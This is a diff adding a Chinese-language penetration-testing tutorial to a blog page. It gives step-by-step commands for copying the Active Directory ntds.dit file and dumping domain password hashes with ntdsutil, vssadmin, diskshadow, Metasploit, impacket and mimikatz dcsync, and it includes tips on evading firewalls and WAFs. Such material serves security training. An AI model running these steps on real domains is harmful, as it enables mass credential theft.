@@ -134,9 +134,303 @@
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>Ntds.dit(也被称为Active Directory database)包含了当前域用户中所有的用户的账号信息，和其HASH值，默认路径为：C:\Windows\NTDS，且只能通过域控制器进程和协议访问。</p>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/1.png" alt="1"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/1.png" alt="1"></p>
 <p>直接复制是复制不出来的，会提示文件已在Encrypting File System(EFS)中打开</p>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/2.png" alt="2"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/2.png" alt="2"></p>
+<h1 id="二、Ntdsutil工具提取"><a href="#二、Ntdsutil工具提取" class="headerlink" title="二、Ntdsutil工具提取"></a>二、Ntdsutil工具提取</h1><ul>
+<li>Ntdsutil介绍：</li>
+</ul>
+<p>ntdsutil.exe是一个Active Directory提供管理设施的命令行工具。可使用ntdsutil.exe执行Active Directory的数据库维护，管理和控制单个主机操作，创建应用程序目录分区，以及删除由未使用Active Directory安装向导（DCPromp.exe）成功降级的域控制器留下的元数据，该工具默认被安装在域控制器上，我们可以在域控制器上进行操作，也可以通过域内机器远程在域控制器上操作</p>
+<p>支持的操作系统：Server 2003、Server 2008、Server 2012</p>
+<ul>
+<li>创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/3.png" alt="3"></p>
+<ul>
+<li>查看快照是否创建成功：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/4.png" alt="4"></p>
+<ul>
+<li>挂载快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/5.png" alt="5"></p>
+<ul>
+<li>拷贝快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202202281107_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/6.png" alt="6"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<p>这样子就可以把ntds文件复制出来了</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/7.png" alt="7"></p>
+<ul>
+<li>卸载并删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/8.png" alt="8"></p>
+<h1 id="三、vssadmin工具提取"><a href="#三、vssadmin工具提取" class="headerlink" title="三、vssadmin工具提取"></a>三、vssadmin工具提取</h1><ul>
+<li>vssadmin介绍：</li>
+</ul>
+<p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统Provider创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的“diff空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p>
+<ul>
+<li>创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/9.png" alt="9"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/10.png" alt="10"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/11.png" alt="11"></p>
+<ul>
+<li>删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/12.png" alt="12"></p>
+<h1 id="四、vssown-vbs"><a href="#四、vssown-vbs" class="headerlink" title="四、vssown.vbs"></a>四、vssown.vbs</h1><ul>
+<li>vssown介绍：</li>
+</ul>
+<p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务。下载地址：<a target="_blank" rel="noopener" href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p>
+<ul>
+<li>启动卷影复制服务：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/13.png" alt="13"></p>
+<ul>
+<li>创建一个C盘的卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/14.png" alt="14"></p>
+<ul>
+<li>列出当前卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/15.png" alt="15"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/16.png" alt="16"></p>
+<ul>
+<li>删除卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;ID&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/17.png" alt="17"></p>
+<h1 id="五、NTDSUTIL的IFM"><a href="#五、NTDSUTIL的IFM" class="headerlink" title="五、NTDSUTIL的IFM"></a>五、NTDSUTIL的IFM</h1><p>将ntds.dit复制到C盘下的test文件夹中的Active Directory文件夹中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/18.png" alt="18"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/19.png" alt="19"></p>
+<h1 id="六、Nishang"><a href="#六、Nishang" class="headerlink" title="六、Nishang"></a>六、Nishang</h1><ul>
+<li>Nishang介绍：</li>
+</ul>
+<p>Nishang 是一个框架和脚本和有效负载的集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队。 Nishang 在渗透测试的所有阶段都很有用。 其中Copy-VSS.ps1脚本，可以有效的下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<ul>
+<li>导入Copy-VSS.ps1：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Copy-VSS.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/20.png" alt="20"></p>
+<ul>
+<li>执行命令：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy-vss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/21.png" alt="21"></p>
+<h1 id="七、vshadow"><a href="#七、vshadow" class="headerlink" title="七、vshadow"></a>七、vshadow</h1><ul>
+<li>vshadow介绍：</li>
+</ul>
+<p>vshadow是一个简单的指令行工具，它允许任何人创建卷影拷贝。因为是微软自带的，所以可以有效的Bypass防火墙。  下载地址：<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
+<ul>
+<li>vshadow创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/22.png" alt="22"></p>
+<ul>
+<li>vshadow查看快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/23.png" alt="23"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/24.png" alt="24"></p>
+<ul>
+<li>vshadow删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -da</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/25.png" alt="25"></p>
+<h1 id="八、diskshadow"><a href="#八、diskshadow" class="headerlink" title="八、diskshadow"></a>八、diskshadow</h1><ul>
+<li>diskshadow介绍：</li>
+</ul>
+<p>DiskShadow.exe这款工具可以使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下DiskShadow.exe使用了一种交互式命令解释器，这里跟DiskRaid或DiskPart比较类似。事实上，因为DiskShadow的代码是由微软官方签名的，而且在Windows Server 2008、Windows Server 2012和Windows Server 2016中默认包含了DiskShadow。DiskShadow.exe也是可以用来操作VSS导出ntds.dit，其功能上类似vshadow。它同样是被放在了c:\windows\system32目录中，而vshadow则是被包含在windowsSDK中，实战中可能还需要想办法传到目标机器上，也就是说，diskshadow在我们实际渗透过程中更便于在目标系统上使用。diskshadow拥有交互模式和非交互模式两种，交互模式需要登录远程桌面等图形化管理方法，不利于隐蔽的进行渗透，所以我们一般使用非交互模式进行操作。因为不论是交互模式还是非交互模式都可以使用EXEC通过调取一个脚本文件执行相关命令</p>
+<ul>
+<li>diskshadow基础用法：</li>
+</ul>
+<p>先写一个执行计算机的命令保存到c盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo exec C:\Windows\System32\calc.exe &gt; c:\command.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后使用diskshadow执行即可打开计算机，使用此方法还可以绕过很多waf，比如powershell无文件落地，因为diskshadow自带微软官方签名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow.exe /s c:\command.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/26.png" alt="26"></p>
+<ul>
+<li>diskshadow提取ntds.dit：</li>
+</ul>
+<p>把以下代码保存到txt并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">exec “cmd.exe” /c copy K:\Windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">list shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/27.png" alt="27"></p>
+<p>可以看到多出来了一个盘，这个盘的windows\NTDS\文件夹是可以复制出来的</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/28.png" alt="28"></p>
+<h1 id="九、使用Metasploit获取域散列"><a href="#九、使用Metasploit获取域散列" class="headerlink" title="九、使用Metasploit获取域散列"></a>九、使用Metasploit获取域散列</h1><p>msf中可能用到的模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/ntds_location		该模块可查看ntds路径</span><br><span class="line">post/windows/gather/smart_hashdump	在线导出域账号hash（建议在2012以上使用）</span><br><span class="line">auxiliary/admin/smb/psexec_ntdsgrad	利用域管账号，导出ntds必要文件到本地</span><br><span class="line">post/windows/gather/ntds_grabber		利用powershell将ntds必要文件下载到本地后导出</span><br><span class="line">post/windows/gather/credentials/domain_hashdump	介绍其方法</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;ntds_location</li>
+</ul>
+<p>		</p>
+<p>该模块可查看ntds路径，首先获取一个域控的shell</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/29.png" alt="29"></p>
+<p>获取shell之后，使用模块进行查找路径：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds</span><br><span class="line">msf6 &gt; use post/windows/gather/ntds_location</span><br><span class="line">msf6 post(windows/gather/ntds_location) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/ntds_location) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/30.png" alt="30"></p>
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</li>
+</ul>
+<p>在线导出域账号hash（建议在2012以上使用）</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search smart_hash</span><br><span class="line">msf6 &gt; use post/windows/gather/smart_hashdump</span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/31.png" alt="31"></p>
+<ul>
+<li>模块：auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrad</li>
+</ul>
+<p>利用域管账号，导出ntds必要文件到本地</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds</span><br><span class="line">msf6 &gt; use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set RHOSTS <span class="number">172.16</span>.<span class="number">1.169</span></span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBDomain 域名</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBUser 用户名</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBPass 密码</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/32.png" alt="32"></p>
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;ntds_grabber</li>
+</ul>
+<p>利用powershell将ntds必要文件下载到本地后导出</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds_grabber</span><br><span class="line">msf6 &gt; use post/windows/gather/ntds_grabber</span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/33.png" alt="33"></p>
+<h1 id="十、QuarksPwDump导出域账号域散列值"><a href="#十、QuarksPwDump导出域账号域散列值" class="headerlink" title="十、QuarksPwDump导出域账号域散列值"></a>十、QuarksPwDump导出域账号域散列值</h1><ul>
+<li>QuarksPwDump介绍：</li>
+</ul>
+<p>QuarksPwDump是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker等等。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/tuthimi/quarkspwdump/">https://github.com/tuthimi/quarkspwdump/</a></p>
+<ul>
+<li>从注册表抓取System：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">save</span> hklm\<span class="keyword">system</span> <span class="keyword">system</span>.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/34.png" alt="34"></p>
+<ul>
+<li>修复ntds.dit：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>QuarksPwDump导出域用户hash到log.txt：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -dhd -sf <span class="keyword">system</span>.hive -nt ntds.dit -o <span class="keyword">log</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/35.png" alt="35"></p>
+<h1 id="十一、使用esedbexport恢复ntds-dit"><a href="#十一、使用esedbexport恢复ntds-dit" class="headerlink" title="十一、使用esedbexport恢复ntds.dit"></a>十一、使用esedbexport恢复ntds.dit</h1><ul>
+<li>安装依赖：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install autoconf automake autopoint libtool pkg-config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/36.png" alt="36"></p>
+<ul>
+<li>安装libesedb：</li>
+</ul>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/libyal/libesedb">https://github.com/libyal/libesedb</a></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/37.png" alt="37"></p>
+<p>进行安装</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.<span class="keyword">com</span>/libyal/libesedb/releases/download/<span class="number">20200418</span>/libesedb-experimental-<span class="number">20200418</span>.tar.gz</span><br><span class="line">tar zvxf libesedb-experimental-<span class="number">20200418</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">sudo make &amp;&amp; make install &amp;&amp; ldconfig</span><br><span class="line">sudo ldconfig</span><br><span class="line">esedbtools/esedbexport</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/38.png" alt="38"></p>
+<ul>
+<li>使用libesedb提取信息：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/39.png" alt="39"></p>
+<p>提取完了后会出现一个文件夹，里面存放了很多个表</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/40.png" alt="40"></p>
+<ul>
+<li>安装ntdsxtract：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.<span class="keyword">com</span>/csababarta/ntdsxtract.git</span><br><span class="line">cd ntdsxtract/</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/41.png" alt="41"></p>
+<p>安装完成后将提取出的tds.dit.export文件夹中的datatable.3和link_table.5文件，以及System文件一起放入ntdsxtract文件夹，system文件位置在</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config</span><br></pre></td></tr></table></figure>
+
+<p>如果复制不出来可以使用diskshadow，或者从注册表中导出</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">save</span> hklm\<span class="keyword">system</span> <span class="keyword">system</span>.hive</span><br></pre></td></tr></table></figure>
+
+<p>然后使用以下命令将域内的所有用户及散列值导出到result.txt文件中</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dsusers.py datatable.<span class="number">3</span> link_table.<span class="number">5</span> output --syshive <span class="keyword">system</span>.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="十二、使用impacket导出Hash"><a href="#十二、使用impacket导出Hash" class="headerlink" title="十二、使用impacket导出Hash"></a>十二、使用impacket导出Hash</h1><ul>
+<li>介绍：</li>
+</ul>
+<p>Impacket是用于处理网络协议的Python类的集合。Impacket专注于提供对数据包的低级编程访问，对于某些协议（如SMB1-3和MSRPC），提供协议实现本身。数据包可以从零开始构造，也可以从原始数据解析，而面向对象的API使使用深层协议层次结构变得简单。</p>
+<ul>
+<li>下载：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.<span class="keyword">com</span>/SecureAuthCorp/impacket.git</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>导出Hash：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -<span class="keyword">system</span> <span class="keyword">SYSTEM</span> -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/42.png" alt="42"></p>
+<h1 id="十三、利用Dcsync获取域用户Hash"><a href="#十三、利用Dcsync获取域用户Hash" class="headerlink" title="十三、利用Dcsync获取域用户Hash"></a>十三、利用Dcsync获取域用户Hash</h1><ul>
+<li>介绍：</li>
+</ul>
+<p>Mimikatz有一个名为dcsync的功能，它利用目录复制服务直接读取ntds.dit文件检索哈希值，但是必须使用域管理员权限运行mimikatz才可以读取ntds.dit</p>
+<ul>
+<li>使用方法：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/43.png" alt="43"></p>
+<ul>
+<li>指定某个用户：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /user:Administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/44.png" alt="44"></p>
 
       </section>
 
